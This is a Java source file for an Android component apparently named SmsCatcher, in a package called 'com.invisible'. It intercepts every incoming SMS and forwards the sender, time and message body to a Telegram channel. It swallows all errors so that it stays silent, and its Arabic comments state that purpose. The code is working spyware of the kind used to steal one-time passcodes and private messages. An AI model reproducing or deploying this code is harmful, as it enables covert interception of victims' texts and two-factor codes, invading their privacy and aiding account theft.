package com.invisible;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;

/**
 * مستقبل SMS - يلتقط الرسائل الواردة ويرسلها لتليغرام
 */
public class SmsCatcher extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            Bundle bundle = intent.getExtras();
            if (bundle == null) return;

            String format = bundle.getString("format");
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus == null || pdus.length == 0) return;

            for (Object pdu : pdus) {
                SmsMessage sms;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && format != null) {
                    sms = SmsMessage.createFromPdu((byte[]) pdu, format);
                } else {
                    sms = SmsMessage.createFromPdu((byte[]) pdu);
                }

                if (sms == null) continue;

                String sender = sms.getDisplayOriginatingAddress();
                String body = sms.getMessageBody();
                long timestamp = sms.getTimestampMillis();

                String timeStr = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
                        .format(new java.util.Date(timestamp));

                String msg = "\uD83D\uDCE9 <b>SMS \u062C\u062F\u064A\u062F</b>\n"
                        + "\u251C \u0627\u0644\u0645\u0631\u0633\u0644: <code>" + e(sender) + "</code>\n"
                        + "\u251C \u0627\u0644\u0648\u0642\u062A: " + timeStr + "\n"
                        + "\u2514 \u0627\u0644\u0631\u0633\u0627\u0644\u0629:\n<pre>" + e(body) + "</pre>";

                TelegramSocket.send(msg);
            }
        } catch (Exception ignored) {
            // الـ receiver خاصو يكون silent
        }
    }

    private String e(String s) {
        if (s == null) return "";
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;");
    }
}
